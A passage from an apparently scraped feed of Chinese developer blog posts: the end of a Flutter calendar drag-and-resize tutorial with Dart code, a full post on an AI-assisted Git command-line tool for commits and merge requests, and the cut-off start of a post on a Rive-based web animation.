<li><strong>位置计算</strong>：根据拖拽偏移量计算新的时间位置</li>
<li><strong>边界处理</strong>：实现最小事件时长限制，确保用户体验</li>
<li><strong>状态更新</strong>：拖拽结束后更新事件数据并刷新UI</li>
</ol>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">widgets/day<span class="hljs-emphasis">_view.dart</span></span></span>
<span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">向上拖拽调整开始时间</span></span></span>
Widget? buildResizeUpGestureDetector(FlutterWeekViewEvent event,) {
  <span class="hljs-keyword">if</span> (widget.resizeEventOptions == <span class="hljs-keyword">null</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
  }
  <span class="hljs-keyword">return</span> GestureDetector(
    onVerticalDragStart: (_) {
      accumulatedResizeOffset = <span class="hljs-number">0</span>;
      originalResizeEventStart = event.start;
    },
    onVerticalDragEnd: (_) {
      <span class="hljs-built_in">DateTime</span> newEventStart = event.start;
      event.start = originalResizeEventStart;
      widget.resizeEventOptions!.onEventResizedUp(event, newEventStart);
      setState(() {
        reset();
        createEventsDrawProperties();
      });
    },
    onVerticalDragUpdate: (details) =&gt; onEventResizeUpUpdate(event, details.primaryDelta ?? <span class="hljs-number">0</span>),
    child: MouseRegion(
      cursor: SystemMouseCursors.resizeUpDown,
      child: Container(color: Colors.transparent),
    ),
  );
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc5437a4d93949928b323329862915bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcmFpbmJveQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770374812&amp;x-signature=L0C0sjHxDk%2Bt%2BK69VVWlFVFHnGs%3D" alt="gestureDetector.png" loading="lazy"/></p>
<h3 data-id="heading-5">实现拖放功能</h3>
<p>利用Flutter中的<code>Draggable</code>和<code>DragTarget</code>组件实现事件的自由拖放：</p>
<blockquote>
<p><code>Draggable</code>可以让组件在界面上任意拖动，同时携带一个泛型T的数据，<code>DragTarget</code>用于定义一个拖动的目标区域，可以接收<code>Draggable</code>组件的信息。</p>
</blockquote>
<ol>
<li><strong>事件包装</strong>：将事件卡片包装在<code>Draggable</code>组件中，支持长按或点击触发拖拽</li>
<li><strong>目标区域</strong>：使用<code>DragTarget</code>包裹整个日视图，接收拖放事件</li>
<li><strong>位置计算</strong>：在拖拽过程中实时计算新位置对应的时间，刷新UI</li>
</ol>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">utils/event<span class="hljs-emphasis">_grid.dart</span></span></span>
<span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">事件拖拽包装</span></span></span>
child = _getDraggableOrLongPressDraggable(
  isLongPress: options.startingGesture == DragStartingGesture.longPress,
  data: event,
  axis: options.allowOnlyVerticalDrag ? Axis.vertical : <span class="hljs-keyword">null</span>,
  feedback: SizedBox(
    height: height!,
    width: width!,
    child: child,
  ),
  childWhenDragging: Opacity(opacity: <span class="hljs-number">0.5</span>, child: child),
  child: child,
);
  
</code></pre>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">widgets/day<span class="hljs-emphasis">_view.dart</span></span></span>
<span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">拖放目标区域</span></span></span>
mainWidget = DragTarget&lt;FlutterWeekViewEvent&gt;(
  builder: (_, __, ___) =&gt; createMainWidget(),
  onMove: (details){
    <span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">计算新位置对应的时间</span></span></span>
    RenderBox renderBox = context.findRenderObject() <span class="hljs-keyword">as</span> RenderBox;
    Offset localOffset = renderBox.globalToLocal(details.offset);
    Offset correctedOffset = Offset(localOffset.dx, localOffset.dy + (verticalScrollController?.offset ?? <span class="hljs-number">0</span>) - widget.padding.top);
    <span class="hljs-built_in">DateTime</span> newStartTime = widget.date.add(calculateOffsetHourMinute(correctedOffset).asDuration);
     <span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">网格对齐处理</span></span></span>
    <span class="hljs-keyword">if</span>(widget.resizeEventOptions!=<span class="hljs-keyword">null</span>) {
      newStartTime= roundTimeToFitGrid(newStartTime,
          gridGranularity: widget.resizeEventOptions!.snapToGridGranularity);
    }
    <span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">更新预览位置</span></span></span>
    widget.timeRangeStartNotifier?.value = newStartTime;
    widget.timeRangeEndNotifier?.value = details.data.end.add(newStartTime.difference(details.data.start));
  },
  onAcceptWithDetails: (details) {
    <span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">处理拖放完成逻辑</span></span></span>
    RenderBox renderBox = context.findRenderObject() <span class="hljs-keyword">as</span> RenderBox;
    Offset localOffset = renderBox.globalToLocal(details.offset);
    Offset correctedOffset = Offset(localOffset.dx, localOffset.dy + (verticalScrollController?.offset ?? <span class="hljs-number">0</span>) - widget.padding.top);
    <span class="hljs-built_in">DateTime</span> newStartTime = widget.date.add(calculateOffsetHourMinute(correctedOffset).asDuration);
    widget.dragAndDropOptions!.onEventDragged(details.data, newStartTime);
    widget.timeRangeStartNotifier?.value = details.data.start;
    widget.timeRangeEndNotifier?.value = details.data.end;
    <span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">更新UI</span></span></span>
    setState(() {
      reset();
      createEventsDrawProperties();
    });
  },
  onLeave: (event){
    <span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">处理拖放离开逻辑</span></span></span>
    <span class="hljs-keyword">if</span>(event!=<span class="hljs-keyword">null</span>) {
      widget.timeRangeStartNotifier?.value = event.start;
      widget.timeRangeEndNotifier?.value = event.end;
    }
  },
);
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e831b256df3649919490fb1d25d6286e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcmFpbmJveQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770374812&amp;x-signature=jeN6xqQo4lttthKUwSccvu3shmo%3D" alt="drag_drop.png" loading="lazy"/></p>
<h2 data-id="heading-6">应用场景与价值</h2>
<p>该技术方案适用于多种需要时间可视化的场景：</p>
<ul>
<li><strong>会议室预订系统</strong>：直观展示会议室使用情况</li>
<li><strong>个人日程管理</strong>：清晰管理每日任务和活动</li>
<li><strong>项目时间线</strong>：可视化项目进度和里程碑</li>
</ul>
<h2 data-id="heading-7">Github</h2>
<p>本文相关的代码基于<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSkyost" target="_blank" title="https://github.com/Skyost" ref="nofollow noopener noreferrer">Skyost</a>的<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSkyost%2FFlutterWeekView" target="_blank" title="https://github.com/Skyost/FlutterWeekView" ref="nofollow noopener noreferrer">FlutterWeekView</a>修改而来，地址如下：
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkongpf8848%2Fflutter_schedule_view" target="_blank" title="https://github.com/kongpf8848/flutter_schedule_view" ref="nofollow noopener noreferrer">github.com/kongpf8848/…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[📦 AI Git CLI：让 AI 帮你写 Commit 和 MR]]></title>    <link>https://juejin.cn/post/7600837236620312628</link>    <guid>https://juejin.cn/post/7600837236620312628</guid>    <pubDate>2026-01-30T08:29:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600837236620312628" data-draft-id="7600728866757754932" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="📦 AI Git CLI：让 AI 帮你写 Commit 和 MR"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-30T08:29:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="cecyci"/> <meta itemprop="url" content="https://juejin.cn/user/2356969294276701"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            📦 AI Git CLI：让 AI 帮你写 Commit 和 MR
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2356969294276701/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    cecyci
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T08:29:28.000Z" title="Fri Jan 30 2026 08:29:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">一、痛点：重复而机械的 Git 工作流</h3>
<p>每次开发新需求，你是否也要重复这一套流程？</p>
<ol>
<li>拉取最新主分支</li>
<li>创建新分支 <code>feat/xxx</code></li>
<li>写代码</li>
<li>提交：</li>
</ol>
<pre><code class="hljs language-git" lang="git">git commit -m "feat: xxxxx"  # 还得想怎么写
git push origin feat/xxx
</code></pre>
<ol start="5">
<li>去 GitLab 手动新建 Merge Request</li>
<li>还可能需 rebase 主分支：</li>
</ol>
<pre><code class="hljs language-css" lang="css">git checkout <span class="hljs-selector-tag">main</span>
git pull origin <span class="hljs-selector-tag">main</span>
git checkout feat/xxx
git rebase <span class="hljs-selector-tag">main</span>
</code></pre>
<p>这些操作重复、琐碎，且 <strong>Commit 消息写起来费神</strong>，<strong>MR 描述更难写全面</strong>。</p>
<h3 data-id="heading-1">二、解决方案：AI CLI —— 一条龙自动化</h3>
<p>因此我开发了一个 <strong>Git + AI 命令行工具</strong>，帮你自动化以上流程，并让 AI 生成规范的 Commit 和 MR 描述。</p>

























<table><thead><tr><th>命令</th><th>功能</th><th>适用场景</th></tr></thead><tbody><tr><td><code>ai git commit</code></td><td>rebase + commit + push + 创建 MR</td><td>完整流程，确保代码与主分支同步</td></tr><tr><td><code>ai git mr</code></td><td>commit + push + 创建 MR</td><td>已有本地更改，直接提交并提 MR</td></tr><tr><td><code>ai git add</code></td><td>add + commit（可选 push）</td><td>仅提交到本地，暂不提 MR</td></tr></tbody></table>
<h3 data-id="heading-2">三、技术实现亮点</h3>
<h4 data-id="heading-3"> 1. <strong>智能生成 Commit 消息</strong></h4>
<p>通过 <code>git diff --cached</code> 获取暂存区改动，发送给 AI（使用token调用AI接口），生成符合 <strong>Conventional Commits</strong> 格式的消息。</p>
<p>prompt</p>
<pre><code class="hljs language-bash" lang="bash">请分析以下代码改动，生成一个简洁的 commit message（格式：<span class="hljs-built_in">type</span>: description）。

要求：
1. 使用常见的 commit <span class="hljs-built_in">type</span>（feat, fix, docs, style, refactor, <span class="hljs-built_in">test</span>, chore）
2. 描述要简洁明了，不超过 50 个字
3. 只输出 commit message，不要其他说明

代码改动：<span class="hljs-variable">${diff}</span>
</code></pre>
<h4 data-id="heading-4">2. <strong>自动创建 MR（使用 GitLab CLI <code>glab</code>）</strong></h4>
<ul>
<li>检查是否已有 MR</li>
<li>获取与主分支的 diff 和 log</li>
<li>调用 AI 生成 <strong>标题 + 详细描述</strong>（含改动点、影响范围、风险）</li>
</ul>
<h4 data-id="heading-5">3. <strong>防止 AI Token 超限</strong></h4>
<ul>
<li>Commit 时：对 diff 长度截断</li>
<li>MR 时：仅提取<strong>关键文件</strong>（新增文件或修改函数超过50行的文件）</li>
</ul>
<h4 data-id="heading-6">4. <strong>健壮的 Git 操作封装</strong></h4>
<ul>
<li>自动检测主分支（main/master）</li>
<li>支持 stash → rebase → pop 流程，处理冲突中断</li>
<li>使用 <code>git status --porcelain</code> 解析状态，避免人工解析输出</li>
</ul>
<h4 data-id="heading-7">5. <strong>多环境配置支持</strong></h4>
<p>通过 <code>dotenv</code> 按优先级加载 <code>.env</code> 文件，方便在不同目录下使用。</p>
<hr/>
<h3 data-id="heading-8">四、示例流程</h3>
<h4 data-id="heading-9">使用 <code>ai git commit</code>：</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 在 feat/0130 分支开发完毕</span>
<span class="hljs-comment"># 2. 一键完成：</span>
ai git commit --main-branch main

<span class="hljs-comment"># 工具会：</span>
<span class="hljs-comment"># ✅ 拉取最新 main</span>
<span class="hljs-comment"># ✅ stash → rebase → pop（如有冲突会暂停）</span>
<span class="hljs-comment"># ✅ 自动 add</span>
<span class="hljs-comment"># ✅ AI 生成 commit message（可编辑确认）</span>
<span class="hljs-comment"># ✅ 推送分支</span>
<span class="hljs-comment"># ✅ 创建 MR（AI 生成标题和描述）</span>
</code></pre>
<hr/>
<h3 data-id="heading-10">五、遇到的问题与解决方案</h3>

























<table><thead><tr><th>问题</th><th>解决方案</th></tr></thead><tbody><tr><td>AI token 可能超限</td><td>对 diff 智能截断，只提取关键改动</td></tr><tr><td>冲突处理中断流程</td><td>采用 stash 机制，冲突时中断并提示用户解决</td></tr><tr><td>不同项目主分支名不同</td><td>支持 <code>--main-branch</code> 参数，默认检测 <code>main</code> 或 <code>master</code></td></tr><tr><td>需兼容不同 GitLab 实例</td><td>使用 <code>glab auth login</code> 提前认证，支持自托管 GitLab</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-11">六、未来改进方向</h3>
<ol>
<li><strong>交互确认</strong>：AI 生成的 Commit 和 MR 信息可编辑后再提交</li>
<li><strong>本地模型支持</strong>：接入 Ollama，保护代码隐私，减少 API 调用成本</li>
<li><strong>多平台支持</strong>：除了 GitLab，也支持 GitHub（通过 <code>gh</code> CLI）</li>
<li><strong>Commit 规范校验</strong>：在 AI 生成后，自动校验是否符合团队规范</li>
<li><strong>可视化冲突解决</strong>：在 rebase 冲突时提供更友好的解决界面</li>
<li><strong>错误处理与回滚</strong>：在 rebase 或 push 失败时，应有更安全的回滚机制</li>
<li><strong>配置化</strong>：允许用户自定义 AI prompt、Commit 类型映射等</li>
<li><strong>进度提示</strong>：长时间操作（如 AI 调用、网络请求）应有 loading 提示</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[复刻 Kimi 官网动画效果：基于 Rive 的交互式 Canvas 实现]]></title>    <link>https://juejin.cn/post/7600692485947490313</link>    <guid>https://juejin.cn/post/7600692485947490313</guid>    <pubDate>2026-01-30T08:27:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600692485947490313" data-draft-id="7600692485947342857" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="复刻 Kimi 官网动画效果：基于 Rive 的交互式 Canvas 实现"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-30T08:27:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="远之喵"/> <meta itemprop="url" content="https://juejin.cn/user/888852236483800"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            复刻 Kimi 官网动画效果：基于 Rive 的交互式 Canvas 实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/888852236483800/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    远之喵
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T08:27:09.000Z" title="Fri Jan 30 2026 08:27:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA6CAYAAAAOeSEWAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAABkLSURBVGhDtZoHnJ1llcbP3Om9ZiYzmfSQhCQQIbRQVQKI9CYC68qKriJK0UXcZRcINqStIoiIqKCi1NACQihBWiCkkJ5MJlMyvd7p7d759v989/sy34yTbIj48Atz71ff855znvOc971xDrB/EtoGI7a9Z8Aq+wZML0mNj7dE95NZ1OKsj1dHo1GbnJpss9OTbWJyonvun4VP1Njuoagtb+m0it4By0iIt8LEeMvkr8XFWcfgkA1gYDLf47i2PzpsyU7UspKSLDoctagTZ7Vc08MzClMS7awJ2ZaflBB78CeET8TYla1dtrKt2w5KS7YCDGzEoz2RqKUmhGw6x2bhuXyOp2BoRXef1Q1E7Lj8TIsMD1sbxu1kcnYSAX1810RMTUmyMB7f2j1gC7NS7byinNiL/kH8Q8a+2NRh77b32El56VaPAe0YeGR2mh2bm+FdMRqP1rbZe+3dFsHT35qcb/Oz0rwzo7Gxs9feYPLS4kM2h8lawee5hPmlJXneFQeGAzJ2F564v7rFzi7Msu3d/Xgjzq5g8ArX8VCNN2vJ28daey0zZJabmGCLslP5HOf+Oygr3UzDGOf+JxrauXfQjslJt+dbuuyMgiwmk+sPAB/b2Lt2NdoMZnuY21qHIvbvUyZ4Z0ZQiXGrWjvsmPxsK4R0nmHA8ZCTQvxVQn5eRipklIBtcVbV1WtHYsjati47ZWKuTUpP9Z4yGk/xDBGe3v1mW4/dOrvYO7P/2G9jRSjf31FnXyaUXiB8r51WaJkM3kcfOSa2FR6qarIenooTLQHPLcC4mYThyw1tVpKWYlVERlZ8nC3Oz3Jzdn1nn5uvQ8OOHYvhR/CvsqffJbkCkZTvcYZ6Z0WTfTovw5Y1dtjXp+TbFPhgf7FfxpYxuMfr2uwo8rEtMmwXF+d6Z8wGmIR2PLyjo8cqOFffP2SLGexJEJCP9R29thkPXlpa4A5Y3w/jmuVNYYwO2QkY7WMtz3mVcE1hkualJdmSolzX8GnpKd4VZq80d1o7zN0RdWxGaqItgbn3B/+vsasgh/UMNBOvzYMZDxtDKp289KGaVguFQvb1yQWWwuB97GaSXqUUnVaYbSUwrDCEBz/C2CM8EhNrP13fbkeSh3OJgCAe2N1CWXKsGOc6TOr5U4q8MwYhDtkTda02MyPN+nnGBQEH7A37NHYz5KOZVv08qyjbSseEzKauPnsMj98wc6Ibcj5UUv7M8QWZTE52jEwGOVaD8U1Dw1YNWX0qM8VKyb80L/TrOPYOzH4KBJQTrK8M7+7KZjuM63sHBt17FubGoibCuf+tarWFGUmuwWeT8/vCXo1tZOYeZcazCaez8MwEzzM+HqhqtiJI5twxL1jeGLYk7jmKMF1JOCbg6Qj5nAdRqX7q3BYm8VAmQvW1lfcMc58IT95uIA3q+gftrDHPXUXJWkVEHJme5Bp5UmHsvIZ/O3l8ECE/FWcsItX2hr0ae8O2Wjs+J43QTbOZzGYQ/7Wtxq6eXjRK3r0By4YJ6Ty8EiYSJqcm2eGeV4Pox/ANENJR49RiEdfqcLflUJrEBZqgxYHrBjn2ExFURqKdVETN9YirJxKxR2rbrYeQv5ISmB6IsiDGNfZGWPeMgkzr58xnPaJ5p6XDZPKz4T77wayJ7jGhhXLwanOHTWBgq5n5q6YUwNJ7l3kKcRl7OJ7fF56l1GzvHbSD8dghTPi0wIRfv6XafjJ3ssv0PnZQ7nZx/etwzO1zJ3lHR2OETTw8x0tOx1AN3De0D7YV+63oGthjaJQ5Ur7eVVZjcdGInUyuaT73ZWg3efV8fZs7cc2E777Qi5eunVbghvPPymrt/krKGfcLd8ybYjdxrK6333Z09rjHZkNuLYzz0uIc+xWCZzz8nbHbe4dsY1e/XUOY+nimvtUaSazv4jXhaQasSbmYmpuenGwHZ8TKggSEQm08rMD7ahBOoExcMqXQegjnZ+CEvaEa1ZQUQkt39dj0zDS7krq+ARmpdws/nlNqD9WFbWN7l5u3wr9MyrcXKUsqWy3jTOaoML4DdaQ83YIoT4VYpEXvYQZLmbX5SLohBrgOj186Kc/iKTUPUhq+Rrm5ekOl3TWv1Mr6hqwbY0VOQXwEo+Moq4Z47q5qsU489G944LyJOW4LOLZOKtT/iI6+nGe/0dhuEd4ltj2NmiuCU4hnk5fHIi7+RK4uTEu0e+s7rAiRcw1CYy3OejvcYz+eXeI9MYY9nu3lYZl0KavJJ7Vjibzgjp319rUZE20j7CkJqFr5JQYgQ39f3eQaKpQk0afy8nl4uBzvjUUTRk7k3iebOm0pabDiyFn2XGu3dRME41CGVeBVqSiVnc6hIUpekp1VjHLDSOEcQlui5W/U8C7IKREjv1Gabw3wRwUTvpv7jybPtzHmIPZ49q6KRjuccqBQVCOtGvqXhrCFUUXJzOYSHt7Kw5Ix9H08dSje1o1JyL73IYXpEMmE5CRbw6wuykx2pR+Pd6/J4JpLiJKV6N9OnrcQNfQ0Zem6qQX2MmFXyWTE+DMO0kGx4e08DEjnXbsYuOq7niHB8jdY/wQ8Srm2XCZZUrOakF1CY5EKX0h93Tu/1J4kRdbDMT8MamgZK9xe3